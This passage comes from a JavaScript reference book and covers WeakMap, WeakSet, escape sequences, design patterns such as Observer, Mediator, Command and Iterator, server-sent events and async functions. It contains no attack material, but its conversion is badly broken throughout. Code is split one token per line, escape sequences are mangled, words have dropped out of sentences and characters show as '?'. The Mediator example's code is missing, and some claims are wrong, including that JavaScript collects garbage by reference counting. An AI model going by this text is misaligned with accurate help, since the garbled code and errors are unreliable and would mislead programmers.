)
;
// <i>2*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch76-4">Section 76.4: Checking if an element with the key exists</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
.has()
To check if an element with a specified key exits in a WeakMap, use
the method. It returns **true** if it exits, and otherwise **false**.
**const**
obj1
=
{
}
,
obj2
=
{
}
;
**const**
weakmap
=
**new**
WeakMap
(
&lbrack;
&lbrack;
obj1
,
7
&rbrack;
&rbrack;
)
;
console.
log
(
weakmap.
has
(
obj1
)
)
;
// <i>true*
console.
log
(
weakmap.
has
(
obj2
)
)
;
// <i>false*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch76-5">Section 76.5: Removing an element with the key</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**delete**
To remove an element with a specified key, use the .() method. It
returns **true** if the element existed and has been removed,
otherwise **false**.
**const**
obj1
=
{
}
,
obj2
=
{
}
;
**const**
weakmap
=
**new**
WeakMap
(
&lbrack;
&lbrack;
obj1
,
7
&rbrack;
&rbrack;
)
;
console.
log
(
weakmap.
**delete**
(
obj1
)
)
;
// <i>true*
console.
log
(
weakmap.
has
(
obj1
)
)
;
// <i>false*
console.
log
(
weakmap.
**delete**
(
obj2
)
)
;
// <i>false*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch76-6">Section 76.6: Weak reference demo</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
JavaScript uses [reference
counting](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Memory_Management)
technique to detect unused objects. When reference count to an object
is zero, that object will be released by the garbage collector.
Weakmap uses weak reference that does not contribute to reference
count of an object, therefore it is very useful to solve memory [leak
problems](http://stackoverflow.com/questions/29413222/what-are-the-actual-uses-of-es6-weakmap).
Here is a demo of weakmap. I use a very large object as value to show
that weak reference does not contribute to reference count.
// <i>manually trigger garbage collection to make sure that we are in good
status.*
&gt;
global.
gc
(
)
;
**undefined**
// <i>check initial memory use*
，
*heapUsed is 4M or so*
&gt;
process.
memoryUsage
(
)
;
{
rss
:
21106688
,
heapTotal
:
7376896
,
heapUsed
:
4153936
,
external
:
9059
}
&gt;
**let**
wm
=
**new**
WeakMap
(
)
;
**undefined**
&gt;
**const**
b
=
**new**
Object
(
)
;
**undefined**
&gt;
global.
gc
(
)
;
**undefined**
// <i>heapUsed is still 4M or so*
&gt;
process.
memoryUsage
(
)
;
{
rss
:
20537344
,
heapTotal
:
9474048
,
heapUsed
:
3967272
,
external
:
8993
}
// <i>add key-value tuple into WeakMap*
，
// <i>key is b*
，
*value is 5&ast;1024&ast;1024 array*
&gt;
wm.
**set**
(
b
,
**new**
Array
(
5
&ast;
1024
&ast;
1024
)
)
;
WeakMap
{
}
// <i>manually garbage collection*
&gt;
global.
gc
(
)
;
**undefined**
// <i>heapUsed is still 45M*
&gt;
process.
memoryUsage
(
)
;
{
rss
:
62652416
,
heapTotal
:
51437568
,
heapUsed
:
45911664
,
external
:
8951
}
// <i>b reference to null*
&gt;
b
=
**null**
;
**null**
// <i>garbage collection*
&gt;
global.
gc
(
)
;
**undefined**
// <i>after remove b reference to object*
，
*heapUsed is 4M again*
// <i>it means the big array in WeakMap is released*
// <i>it also means weekmap does not contribute to big array&apos;s reference
count, only b does.*
&gt;
process.
memoryUsage
(
)
;
{
rss
:
20639744
,
heapTotal
:
8425472
,
heapUsed
:
3979792
,
external
:
8956
}
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch77">Chapter 77: WeakSet</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch77-1">Section 77.1: Creating a WeakSet object</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
The WeakSet object is used for storing weakly held objects in a
collection. The difference from Set is that you can&apos;t store primitive
values, like numbers or string. Also, references to the objects in the
collection are held weakly, which means that if there is no other
reference to an object stored in a WeakSet, it can be garbage
collected.
The WeakSet constructor has an optional parameter, which can be any
iterable object (for example an array). All of its elements will be
added to the created WeakSet.
**const**
obj1
=
{
}
,
obj2
=
{
}
;
**const**
weakset
=
**new**
WeakSet
(
&lbrack;
obj1
,
obj2
&rbrack;
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch77-2">Section 77.2: Adding a value</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
.add()
To add a value to a WeakSet, use the method. This method is chainable.
**const**
obj1
=
{
}
,
obj2
=
{
}
;
**const**
weakset
=
**new**
WeakSet
(
)
;
weakset.
add
(
obj1
)
.
add
(
obj2
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch77-3">Section 77.3: Checking if a value exists</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
.has()
To check if a value exits in a WeakSet, use the method.
**const**
obj1
=
{
}
,
obj2
=
{
}
;
**const**
weakset
=
**new**
WeakSet
(
&lbrack;
obj1
&rbrack;
)
;
console.
log
(
weakset.
has
(
obj1
)
)
;
// <i>true*
console.
log
(
weakset.
has
(
obj2
)
)
;
// <i>false*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch77-4">Section 77.4: Removing a value</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
.**delete**()
To remove a value from a WeakSet, use the method. This method returns
**true** if the value existed and has been removed, otherwise
**false**.
**const**
obj1
=
{
}
,
obj2
=
{
}
;
**const**
weakset
=
**new**
WeakSet
(
&lbrack;
obj1
&rbrack;
)
;
console.
log
(
weakset.
**delete**
(
obj1
)
)
;
// <i>true*
console.
log
(
weakset.
**delete**
(
obj2
)
)
;
// <i>false*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch78">Chapter 78: Escape Sequences</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch78-1">Section 78.1: Entering special characters in strings and regular expressions</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Most printable characters can be included in string or regular
expression literals just as they are, e.g.
**var**
str
=
&quot;
ポ
ケ
モ
ン
&quot;
;
// <i>a valid string*
**var**
regExp
=
*/&lbrack;*
Α
*-*
Ω
α
*-*
ω
*&rbrack;*
*/*
;
// <i>matches any Greek letter without diacritics*
In order to add arbitrary characters to a string or regular
expression, including non-printable ones, one has to use *escape
sequences*. Escape sequences consist of a backslash (&quot;&bsol;&bsol;&bsol;&amp;quot;)
followed by one or more other characters. To write an escape sequence
for a particular character, one typically (but not always) needs to
know its hexadecimal character code.
JavaScript provides a number of different ways to specify escape
sequences, as documented in the examples in this topic. For instance,
the following escape sequences all denote the same character: the
*line feed* (Unix newline character), with character code U+000A.
&bsol;&bsol;&bsol;&bsol;u
&bsol;&bsol;&bsol;&bsol;n
&bsol;&bsol;&bsol;&bsol;x0a
&bsol;&bsol;&bsol;&bsol;u000a
{a} new in ES6, only in strings
&bsol;&bsol;&bsol;&bsol;012 forbidden in string literals in strict mode and in template
strings &bsol;&bsol;&bsol;&bsol;cj only in regular expressions
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch78-2">Section 78.2: Escape sequence types</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**Single character escape sequences**
Some escape sequences consist of a backslash followed by a single
character.
alert ( &quot;Hello**&bsol;&bsol;n**World&quot;
For example, in );, the escape sequence &bsol;&bsol;n is used to introduce a
newline in the string parameter, so that the words &quot;Hello&quot; and
&quot;World&quot; are displayed in consecutive lines.
**Escape sequence Character**                                  **Unicode**
  &bsol;&bsol;b (only in strings, not in regular expressions) backspace    U+0008
  &bsol;&bsol;t horizontal tab                                             U+0009
  &bsol;&bsol;n line feed                                                  U+000A
  &bsol;&bsol;v vertical tab                                               U+000B
  &bsol;&bsol;f form feed                                                  U+000C
&bsol;&bsol;r carriage return U+000D
Additionally, the sequence &bsol;&bsol;0, when not followed by a digit between 0
and 7, can be used to escape the null character (U+0000).
The sequences &bsol;&bsol;&bsol;&bsol;, &bsol;&amp;apos; and &bsol;&amp;quot; are used to escape the character
that follows the backslash. While similar to nonescape sequences,
where the leading backslash is simply ignored (i.e. &bsol;&bsol;? for ?), they
are explicitly treated as single character escape sequences inside
strings as per the specification.
**Hexadecimal escape sequences**
Characters with codes between 0 and 255 can be represented with an
escape sequence where &bsol;&bsol;x is followed by the 2-digit hexadecimal
character code. For example, the non-breaking space character has code
160 or A0 in base 16, and so it can be written as &bsol;&bsol;xa0. **var** str =
&quot;ONE**&bsol;&bsol;x**a0LINE&quot;; // <i>ONE and LINE with a non-breaking space
between them*
For hex digits above 9, the letters a to f are used, in lowercase or
uppercase without distinction.
**var** regExp1 = */&lbrack;&bsol;&bsol;x00-xff&rbrack;/*; // <i>matches any character between
U+0000 and U+00FF* **var** regExp2 = */&lbrack;&bsol;&bsol;x00-xFF&rbrack;/*; // <i>same as
above*
**4-digit Unicode escape sequences**
Characters with codes between 0 and 65535 (216 - 1) can be represented
with an escape sequence where &bsol;&bsol;u is followed by the 4-digit
hexadecimal character code.
For example, the Unicode standard defines the right arrow character
(&quot;?&quot;) with the number 8594, or 2192 in hexadecimal format. So an
escape sequence for it would be &bsol;&bsol;u2192.
This produces the string &quot;A ? B&quot;:
**var**
str
=
&quot;A
**&bsol;&bsol;u**
2192
B&quot;
;
For hex digits above 9, the letters a to f are used, in lowercase or
uppercase without distinction. Hexadecimal codes shorter than 4 digits
must be left-padded with zeros: &bsol;&bsol;u007A for the small letter &quot;z&quot;.
**Curly bracket Unicode escape sequences**
<h5>Version ≥ 6</h5>
ES6 extends Unicode support to the full code range from 0 to 0x10FFFF.
In order to escape characters with code greater than 216 - 1, a new
syntax for escape sequences was introduced:
&bsol;&bsol;u
{
???
}
Where the code in curly braces is hexadecimal representation of the
code point value, e.g.
alert
(
&quot;Look!
**&bsol;&bsol;u**
{1
f440}&quot;
)
;
// <i>Look! ????*
In the example above, the code 1f440 is the hexadecimal representation
of the character code of the Unicode Character *Eyes*.
Note that the code in curly braces may contain any number of hex
digits, as long the value does not exceed 0x10FFFF. For hex digits
above 9, the letters a to f are used, in lowercase or uppercase
without distinction.
Unicode escape sequences with curly braces only work inside strings,
not inside regular expressions!
**Octal escape sequences**
Octal escape sequences are deprecated as of ES5, but they are still
supported inside regular expressions and in non-strict mode also
inside non-template strings. An octal escape sequence consists of one,
two or three octal digits, with value between 0 and 3778 = 255.
105
For example, the capital letter &quot;E&quot; has character code 69, or 105 in
base 8. So it can be represented with the escape sequence &bsol;&bsol;:
/
&bsol;&bsol;105scape
/
.
test
(
&quot;Fun with Escape Sequences&quot;
)
;
// <i>true*
In strict mode, octal escape sequences are not allowed inside strings
and will produce a syntax error. It is worth to note that &bsol;&bsol;0, unlike
&bsol;&bsol;00 or &bsol;&bsol;000, is *not* considered an octal escape sequence, and is
thus still allowed inside strings (even template strings) in strict
mode.
**Control escape sequences**
Some escape sequences are only recognized inside regular expression
literals (not in strings). These can be used to escape characters with
codes between 1 and 26 (U+0001U+001A). They consist of a single
letter AZ (case makes no difference) preceded by &bsol;&bsol;c. The alphabetic
position of the letter after &bsol;&bsol;c determines the character code.
For example, in the regular expression
&grave;
/
&bsol;&bsol;cG
/
&grave;
The letter &quot;G&quot; (the 7th letter in the alphabet) refers to the
character U+0007, and thus
&grave;
/
&bsol;&bsol;cG&grave;
/
.
test
(
String
.
fromCharCode
(
7
)
)
;
// <i>true*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch79">Chapter 79: Behavioral Design Patterns</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch79-1">Section 79.1: Observer pattern</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
The [Observer](https://en.wikipedia.org/wiki/Observer_pattern) pattern
is used for event handling and delegation. A *subject* maintains a
collection of *observers.* The subject then notifies these observers
whenever an event occurs. If you&apos;ve ever used
[addEventListener](https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener)
then you&apos;ve utilized the Observer pattern.
**function**
Subject
(
)
{
**this**
.
observers
=
&lbrack;
&rbrack;
;
// <i>Observers listening to the subject*
**this**
.
registerObserver
=
**function**
(
observer
)
{
// <i>Add an observer if it isn&apos;t already being tracked*
**if**
(
**this**
.
observers
.
indexOf
(
observer
)
===
&minus;
1
)
{
**this**
.
observers
.
push
(
observer
)
;
}
}
;
**this**
.
unregisterObserver
=
**function**
(
observer
)
{
// <i>Removes a previously registered observer*
**var**
index
=
**this**
.
observers
.
indexOf
(
observer
)
;
**if**
(
index
&gt;
&minus;
1
)
{
**this**
.
observers
.
splice
(
index
,
1
)
;
}
}
;
**this**
.
notifyObservers
=
**function**
(
message
)
{
// <i>Send a message to all observers*
**this**
.
observers
.
forEach
(
**function**
(
observer
)
{
observer.
notify
(
message
)
;
}
)
;
}
;
}
**function**
Observer
(
)
{
**this**
.
notify
=
**function**
(
message
)
{
// <i>Every observer must implement this function*
}
;
}
**Example usage:**
**function**
Employee
(
name
)
{
**this**
.
name
=
name
;
// <i>Implement &grave;notify&grave; so the subject can pass us messages*
**this**
.
notify
=
**function**
(
meetingTime
)
{
console.
log
(
**this**
.
name
&plus;
&apos;: There is a meeting at &apos;
&plus;
meetingTime
)
;
}
;
}
**var**
bob
=
**new**
Employee
(
&apos;Bob&apos;
)
;
**var**
jane
=
**new**
Employee
(
&apos;Jane&apos;
)
;
**var**
meetingAlerts
=
**new**
Subject
(
)
;
meetingAlerts.
registerObserver
(
bob
)
;
meetingAlerts.
registerObserver
(
jane
)
;
meetingAlerts.
notifyObservers
(
&apos;4pm&apos;
)
;
// <i>Output:*
// <i>Bob: There is a meeting at 4pm*
// <i>Jane: There is a meeting at 4pm*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch79-2">Section 79.2: Mediator Pattern</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Think of the mediator pattern as the flight control tower that
controls planes in the air: it directs this plane to land now, the
second to wait, and the third to take off, etc. However no plane is
ever allowed to talk to its peers.
This is how mediator works, it works as a communication hub among
different modules, this way you reduce module dependency on each
other, increase loose coupling, and consequently portability.
This [**Chatroom
example**](http://www.dofactory.com/javascript/mediator-design-pattern)
explains how mediator patterns works:
![](./images/image041.png){width="7.486805555555556in"
height="8.206944444444444in"}
}
)
(
)
;
**function**
run
(
)
{
**var**
yoko
=
**new**
Participant
(
&quot;Yoko&quot;
)
;
**var**
john
=
**new**
Participant
(
&quot;John&quot;
)
;
**var**
paul
=
**new**
Participant
(
&quot;Paul&quot;
)
;
**var**
ringo
=
**new**
Participant
(
&quot;Ringo&quot;
)
;
**var**
chatroom
=
**new**
Chatroom
(
)
;
chatroom.
register
(
yoko
)
;
chatroom.
register
(
john
)
;
chatroom.
register
(
paul
)
;
chatroom.
register
(
ringo
)
;
yoko.
send
(
&quot;All you need is love.&quot;
)
;
yoko.
send
(
&quot;I love you John.&quot;
)
;
paul.
send
(
&quot;Ha, I heard that!&quot;
)
;
log.
show
(
)
;
}
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch79-3">Section 79.3: Command</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
The command pattern encapsulates parameters to a method, current
object state, and which method to call. It is useful to
compartmentalize everything needed to call a method at a later time.
It can be used to issue a &quot;command&quot; and decide later which piece of
code to use to execute the command.
>
There are three components in this pattern:

1.  Command Message - the command itself, including the method name,
    parameters, and state

2.  Invoker - the part which instructs the command to execute its
    instructions. It can be a timed event, user interaction, a step in a
    process, callback, or any way needed to execute the command.

3.  Receiver - the target of the command execution.

**Command Message as an Array**
>
**var** aCommand = **new** Array(); aCommand.push(**new**
Instructions().DoThis); // <i>Method to execute* aCommand.push(&quot;String
Argument&quot;); // <i>string argument* aCommand.push(777); // <i>integer
argument* aCommand.push(**new** Object {} ); // <i>object argument*
aCommand.push(**new** Array() ); // <i>array argument*
>
Constructor for command class

class

DoThis

{

constructor

(

stringArg

,

numArg

,

objectArg

,

arrayArg

)

{

**this**

.&lowbar;stringArg

=

stringArg

;

**this**

.&lowbar;numArg

=

numArg

;

**this**

.&lowbar;objectArg

=

objectArg

;

**this**

.&lowbar;arrayArg

=

arrayArg

;

}

Execute

(

)

{

**var**

receiver

=

**new**

Instructions

(

)

;

receiver.

DoThis

(

**this**

.&lowbar;stringArg

,

**this**

.&lowbar;numArg

,

**this**

.&lowbar;objectArg

,

**this**

.&lowbar;arrayArg

)

;

}

}

**Invoker**

aCommand.

Execute

(

)

;

Can invoke:
>
immediately in response to an event in a sequence of execution as a
callback response or in a promise at the end of an event loop
>
in any other needed way to invoke a method
>
**Receiver**

class

Instructions

{

DoThis

(

stringArg

,

numArg

,

objectArg

,

arrayArg

)

{

console.

log

(

&grave;&dollar;

{

stringArg

}

,

&dollar;

{

numArg

}

,

&dollar;

{

objectArg

}

,

&dollar;

{

arrayArg

}

&grave;

)

;

}

}

A client generates a command, passes it to an invoker that either
executes it immediately or delays the command, and then the command
acts upon a receiver. The command pattern is very useful when used
with companion patterns to create messaging patterns.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch79-4">Section 79.4: Iterator</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
An iterator pattern provides a simple method for selecting,
sequentially, the next item in a collection.
**Fixed Collection**
class
BeverageForPizza
{
constructor
(
preferenceRank
)
{
**this**
.
beverageList
=
beverageList
;
**this**
.
pointer
=
0
;
}
next
(
)
{
**return**
**this**
.
beverageList
&lbrack;
**this**
.
pointer
++
&rbrack;
;
}
**var**
withPepperoni
=
**new**
BeverageForPizza
(
&lbrack;
&quot;Cola&quot;
,
&quot;Water&quot;
,
&quot;Beer&quot;
&rbrack;
)
;
withPepperoni.
next
(
)
;
// <i>Cola*
withPepperoni.
next
(
)
;
// <i>Water*
withPepperoni.
next
(
)
;
// <i>Beer*
In ECMAScript 2015 iterators are a built-in as a method that returns
done and value. done is true when the iterator is at the end of the
collection
**function**
preferredBeverage
(
beverage
)
{
**if**
(
beverage
==
&quot;Beer&quot;
)
{
**return**
**true**
;
}
**else**
{
**return**
**false**
;
}
}
**var**
withPepperoni
=
**new**
BeverageForPizza
(
&lbrack;
&quot;Cola&quot;
,
&quot;Water&quot;
,
&quot;Beer&quot;
,
&quot;Orange Juice&quot;
&rbrack;
)
;
**for**
(
**var**
bevToOrder of withPepperoni
)
{
**if**
(
preferredBeverage
(
bevToOrder
)
{
bevToOrder.
done
;
// <i>false, because &quot;Beer&quot; isn&apos;t the final collection item*
**return**
bevToOrder
;
// <i>&quot;Beer&quot;</i>
}
}
**As a Generator**
class
FibonacciIterator
{
constructor
(
)
{
**this**
.
previous
=
1
;
**this**
.
beforePrevious
=
1
;
}
next
(
)
{
**var**
current
=
**this**
.
previous
&plus;
**this**
.
beforePrevious
;
**this**
.
beforePrevious
=
**this**
.
previous
;
**this**
.
previous
=
current
;
**return**
current
;
}
}
**var**
fib
=
**new**
FibonacciIterator
(
)
;
fib.
next
(
)
;
// <i>2*
fib.
next
(
)
;
// <i>3*
fib.
next
(
)
;
// <i>5*
In ECMAScript 2015
**function**
&ast;
FibonacciGenerator
(
)
{
// <i>asterisk informs javascript of generator*
**var**
previous
=
1
;
**var**
beforePrevious
=
1
;
while
(
**true**
)
{
**var**
current
=
previous
&plus;
beforePrevious
;
beforePrevious
=
previous
;
previous
=
current
;
yield current
;
// <i>This is like return but*
// <i>keeps the current state of the function*
// <i>i.e it remembers its place between calls*
}
}
**var**
fib
=
FibonacciGenerator
(
)
;
fib.
next
(
)
.
value
;
// <i>2*
fib.
next
(
)
.
value
;
// <i>3*
fib.
next
(
)
.
value
;
// <i>5*
fib.
next
(
)
.
done
;
// <i>false*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch80">Chapter 80: Server-sent events</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch80-1">Section 80.1: Setting up a basic event stream to the server</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
You can setup your client browser to listen in incoming server events
using the EventSource object. You will need to supply the constructor
a string of the path to the server&apos; API endpoint the will subscribe
the client to the server events.
Example:
**var** eventSource     =   **new** EventSource     (   &quot;api/my-events&quot;
);
onmessage
Events have names with which they are categorized and sent, and a
listener must be setup to listen to each such event by name. the
default event name is message and in order to listen to it you must
use the appropriate event listener, .
evtSource.
onmessage
=
**function**
(
event
)
{
**var**
data
=
JSON.
parse
(
event.
data
)
;
// <i>do something with data*
}
text / plain
The above function will run every time the server will push an event
to the client. Data is sent as , if you send JSON data you may want to
parse it.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch80-2">Section 80.2: Closing an event stream</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
EventSource.close
An event stream to the server can be closed using the () method
**var**
eventSource
=
**new**
EventSource
(
&quot;api/my-events&quot;
)
;
// <i>do things &hellip;</i>
eventSource.
close
(
)
;
// <i>you will not receive anymore events from this object*
close
The .() method does nothing is the stream is already closed.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch80-3">Section 80.3: Binding event listeners to EventSource</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
You can bind event listeners to the EventSource object to listen to
different events channels using the
addEventListener
. method.
EventSource.addEventListener(name: String, callback: Function,
&lbrack;options&rbrack;)
**name**: The name related to the name of the channel the server is
emitting events to.
**callback**: The callback function runs every time an event bound to
the channel is emitted, the function provides the event as an
argument. **options**: Options that characterize the behavior of the
event listener.
The following example shows a heartbeat event stream from the server,
the server sends events on the heartbeat channel and this routine will
always run when an event in accepted.
**var**
eventSource
=
**new**
EventSource
(
&quot;api/heartbeat&quot;
)
;
&hellip;
eventSource
.
addEventListener
(
&quot;heartbeat&quot;
,
**function**
(
event
)
{
**var**
status
=
event.
data
;
**if**
(
status
==
&apos;OK&apos;
)
{
// <i>do something*
}
}
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch81">Chapter 81: Async functions (async/await)</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
async and await build on top of promises and generators to express
asynchronous actions inline. This makes asynchronous or callback code
much easier to maintain.

Functions with the async keyword return a Promise, and can be called
with that syntax.
async **function**
Inside an the await keyword can be applied to any Promise, and will
cause all of the function body after the await to be executed after
the promise resolves.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch81-1">Section 81.1: Introduction</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
A function defined as async is a function that can perform
asynchronous actions but still look synchronous. The way it&apos;s done is
using the await keyword to defer the function while it waits for a
Promise to resolve or reject.
>
**Note:** Async functions are [a Stage 4 (&quot;Finished&quot;)
proposal](https://github.com/tc39/proposals/blob/master/finished-proposals.md)
on track to be included in the ECMAScript 2017 standard.
>
For instance, using the promise-based [Fetch
API](https://developer.mozilla.org/en/docs/Web/API/Fetch_API):

async

**function**

getJSON

(

url

)

{

**try**

{

**const**

response

=

await fetch

(

url

)

;

**return**

await response.

json

(

)

;

}

**catch**

(

err

)

{

// <i>Rejections in the promise will get thrown here*

console.

error

(

err.

message

)

;

}

}

An async function always returns a Promise itself, so you can use it
in other asynchronous functions.

**Arrow function style**

**const**

getJSON

=

async url

=&gt;

{

**const**

response

=

await fetch

(

url

)

;
**return**
await response.
json
(
)
;
}
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch81-2">Section 81.2: Await and operator precedence</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
You have to keep the operator precedence in mind when using await
keyword.
getUnicorn
getSize
Imagine that we have an asynchronous function which calls another
asynchronous function, () which returns a Promise that resolves to an
instance of class Unicorn. Now we want to get the size of the unicorn
using the () method of that class.
Look at the following code:
async
**function**
myAsyncFunction
(
)
{
await getUnicorn
(
)
.
getSize
(
)
